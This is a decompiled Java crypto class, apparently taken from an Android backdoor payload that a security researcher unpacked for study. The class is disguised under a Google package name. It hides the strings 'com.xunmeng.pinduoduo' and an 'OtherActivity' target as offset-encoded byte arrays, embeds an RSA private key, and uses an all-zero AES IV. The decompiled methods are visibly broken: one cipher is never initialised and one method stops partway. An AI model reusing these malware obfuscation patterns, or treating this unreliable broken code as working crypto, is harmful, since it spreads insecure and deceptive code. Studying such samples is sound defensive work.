package com.google.android.sd.biz_dynamic_dex.base;

import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Crypto {
  private static final String ALGORITHM_AES = "AES";
  
  private static final String ALGORITHM_RSA = "RSA";
  
  public static final String RSA_PRIVATE_KEY_BIZ = "MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAMtq45ofQXDviiuyiVcX/WdZDQJ7OFtCcnEFtvMgU0obzoziuiwSWkNx640ZwKXY1zgoL0Rr+xQ33tS3H8XRKyQbc/etAo9dBTlh8a/l5BCOo21DdGE8PAa1b2FI9YhB4D1SLVSZ1yOyuMxiCpVHWGyio+1t9Ah3Wnwh41/DhO63AgMBAAECgYAfT8zJJJaGM9ko8MqDRYYUKnj+MMl0Ar5q9145/nfTqIQa26ucrRaH2zlO9u/Yl5BJbKYZ+iUj75W1WJrjcFcbaVYLqoRdMNI9SVvjbKEK7xFQAD4d0BZzrD0H8S8ahQ0T5sBMYSJBWr9OaMfGepl4BZGZyvCH3st7YfHqVQF8wQJBAPPQj6BKb2mSqfz+KEYsg7IWxWgbX+kicdnDm5TobYqQ2XGyMsZlsfvafjt9iRyU7exrZQKtSWXzRQjH1eoNWv0CQQDVlXl+m+nRWw7/niSKSYcsocrwTkt4WJ+Mrk4sdl/WlZvPujCcDhuCeWDTXIvNYPeHfI8A1pySo0CAgo+PrSDDAkAEy6BXjb89O1Y+lJ0kLDH26b2+O3OaeUP1/YPs3NlytUChnNik0FE82+JJt0FgH4nCcaZN9CySZcOA1bVeYh7dAkEAmGqCuQcqZGxG18NS8BxoikErQTGeSdN0iEAbKT+QROGevy5vYe3vU7yqjCqO2ZFJEzagFkkQktRNQ2foau9xYQJBAMlac5HjGzDN9u6sLUB6vT33rsf7HmuH7XJUGRCgCSOtC8awyqWF9Gb48Amh5lyHOo3JSISE1YFuqQAo539e+9Y=";
  
  public static final String RSA_PUBLIC_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCgXnv1pdUaxZb5YqbHZ1GYagbrOZH0PfemeSZfi4szU+IUMHpnJX4GKKbRRMLYHUoozvgFwi8/wiQUq1NTtNXs6tFe2RI6R7/szkCmWhV5e+XKZQnJ2YNxvZLxTF/UKuFnFZ+RHCT8yf1/LQj2mfUbTs9zxqlxWpqkr6mAPVuJYwIDAQAB";
  
  private static final String TRANSFORMATION_AES_PADDING = "AES/CBC/PKCS5Padding";
  
  private static final String TRANSFORMATION_RSA_PADDING = "RSA/ECB/PKCS1Padding";
  
  private static final byte[] bp;
  
  private static final byte[] bs = new byte[] { 
      67, 79, 77, 14, 88, 85, 78, 77, 69, 78, 
      71, 14, 80, 73, 78, 68, 85, 79, 68, 85, 
      79 };
  
  static {
    bp = new byte[] { 
        67, 79, 77, 14, 88, 85, 78, 77, 69, 78, 
        71, 14, 80, 73, 78, 68, 85, 79, 68, 85, 
        79, 14, 68, 90, 81, 67, 14, 65, 67, 84, 
        73, 86, 69, 14, 47, 84, 72, 69, 82, 33, 
        67, 84, 73, 86, 73, 84, 89 };
  }
  
  public static String decrypt(byte[] paramArrayOfbyte, String paramString) {
    try {
      IvParameterSpec ivParameterSpec = new IvParameterSpec(new byte[16]);
      SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfbyte, "AES");
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      return new String(cipher.doFinal(Base64.decode(paramString, 2)), StandardCharsets.UTF_8);
    } finally {
      paramArrayOfbyte = null;
    } 
  }
  
  public static String encrypt(byte[] paramArrayOfbyte, String paramString) {
    try {
      IvParameterSpec ivParameterSpec = new IvParameterSpec(new byte[16]);
      SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfbyte, "AES");
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      return Base64.encodeToString(cipher.doFinal(paramString.getBytes()), 2);
    } finally {
      paramArrayOfbyte = null;
    } 
  }
  
  public static byte[] encryptAes(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2) {
    try {
      IvParameterSpec ivParameterSpec = new IvParameterSpec(new byte[16]);
      SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfbyte1, "AES");
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      return cipher.doFinal(paramArrayOfbyte2);
    } finally {
      paramArrayOfbyte1 = null;
    } 
  }
  
  public static String encryptAesKey(byte[] paramArrayOfbyte) {
    try {
      paramArrayOfbyte = Base64.encodeToString(paramArrayOfbyte, 2).getBytes();
      byte[] arrayOfByte = Base64.decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCgXnv1pdUaxZb5YqbHZ1GYagbrOZH0PfemeSZfi4szU+IUMHpnJX4GKKbRRMLYHUoozvgFwi8/wiQUq1NTtNXs6tFe2RI6R7/szkCmWhV5e+XKZQnJ2YNxvZLxTF/UKuFnFZ+RHCT8yf1/LQj2mfUbTs9zxqlxWpqkr6mAPVuJYwIDAQAB", 2);
      RSAPublicKey rSAPublicKey = (RSAPublicKey)KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(arrayOfByte));
      Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
      cipher.init(1, rSAPublicKey);
      paramArrayOfbyte = cipher.doFinal(paramArrayOfbyte);
      if (paramArrayOfbyte != null)
        return Base64.encodeToString(paramArrayOfbyte, 2); 
    } finally {}
    return "";
  }
  
  public static byte[] encryptRsa(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2) {
    try {
      RSAPrivateKey rSAPrivateKey = (RSAPrivateKey)KeyFactory.getInstance("RSA").generatePrivate(new PKCS8EncodedKeySpec(paramArrayOfbyte1));
      Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
      cipher.init(1, rSAPrivateKey);
      int j = rSAPrivateKey.getModulus().bitLength() / 8 - 11;
      if (paramArrayOfbyte2.length <= j)
        return cipher.doFinal(paramArrayOfbyte2); 
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    } finally {
      paramArrayOfbyte1 = null;
    } 
  }
  
  public static String parse1() {
    StringBuilder stringBuilder = new StringBuilder();
    byte[] arrayOfByte = bs;
    int j = arrayOfByte.length;
    for (int i = 0; i < j; i++)
      stringBuilder.append((char)(arrayOfByte[i] + 32)); 
    return stringBuilder.toString();
  }
  
  public static String parse2() {
    StringBuilder stringBuilder = new StringBuilder();
    byte[] arrayOfByte = bp;
    int j = arrayOfByte.length;
    for (int i = 0; i < j; i++)
      stringBuilder.append((char)(arrayOfByte[i] + 32)); 
    return stringBuilder.toString();
  }
  
  public static byte[] randomAesKey() {
    try {
      KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
      return keyGenerator.generateKey().getEncoded();
    } finally {
      Exception exception = null;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\Crypto.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */